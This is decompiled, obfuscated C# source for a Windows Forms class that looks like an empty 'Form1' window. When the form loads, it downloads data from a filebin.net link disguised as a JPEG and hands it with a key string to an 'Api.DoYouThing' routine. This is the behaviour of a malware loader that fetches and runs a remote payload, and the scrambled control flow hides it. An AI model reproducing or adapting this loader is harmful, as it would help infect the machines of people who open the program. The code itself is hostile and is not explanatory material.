using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Library;

namespace Ydmdyualevnbexwgl;

public sealed class c : Form
{
	private IContainer m_a;

	private static c ExcludeException;

	public c()
	{
		a();
	}

	private void a(object sender, EventArgs e)
	{
		Api.DoYouThing(new WebClient().DownloadData("https://filebin.net/shl9j6q8vovyd11d/mscif.jpg"), "g2lefZNnQ");
	}

	protected override void Dispose(bool a)
	{
		if (!a || this.m_a == null)
		{
			goto IL_000b;
		}
		goto IL_0031;
		IL_0031:
		this.m_a.Dispose();
		goto IL_000b;
		IL_000b:
		((Form)this).Dispose(a);
		if (_003CModule_003E_007Ba75b27da_002Da501_002D4f51_002Dae75_002D3cf277e407e8_007D.m_80ce51934dd04e7d88271565bece0b7b != 0)
		{
			switch (0)
			{
			default:
				return;
			case 1:
				break;
			case 0:
			case 2:
				return;
			}
			goto IL_0031;
		}
	}

	private void a()
	{
		while (true)
		{
			((Control)this).SuspendLayout();
			while (true)
			{
				((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
				while (true)
				{
					((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
					FlushException(this, new Size(800, 450));
					int num = 1;
					if (_003CModule_003E_007Ba75b27da_002Da501_002D4f51_002Dae75_002D3cf277e407e8_007D.m_1ae243c8c95d41f4b36a9b50c6223d7d == 0)
					{
						goto IL_0006;
					}
					goto IL_003a;
					IL_003a:
					switch (num)
					{
					case 2:
						break;
					case 5:
						continue;
					default:
						goto end_IL_0059;
					case 1:
						goto end_IL_0085;
					case 4:
						SortException(this, bool_0: false);
						return;
					}
					goto IL_0006;
					IL_0006:
					((Control)this).set_Name("Form1");
					StartException(this, "Form1");
					((Form)this).add_Load((EventHandler)a);
					num = 4;
					if (_003CModule_003E_007Ba75b27da_002Da501_002D4f51_002Dae75_002D3cf277e407e8_007D.m_ba04b5ae095c41cab4278932a2eb814b != 0)
					{
						break;
					}
					goto IL_003a;
					continue;
					end_IL_0059:
					break;
				}
				continue;
				end_IL_0085:
				break;
			}
		}
	}

	internal static bool DestroyException()
	{
		return ExcludeException == null;
	}

	internal static c ReadException()
	{
		return ExcludeException;
	}

	internal static void FlushException(object object_0, Size size_0)
	{
		((Form)object_0).set_ClientSize(size_0);
	}

	internal static void StartException(object object_0, object object_1)
	{
		((Control)object_0).set_Text((string)object_1);
	}

	internal static void SortException(object object_0, bool bool_0)
	{
		((Control)object_0).ResumeLayout(bool_0);
	}
}
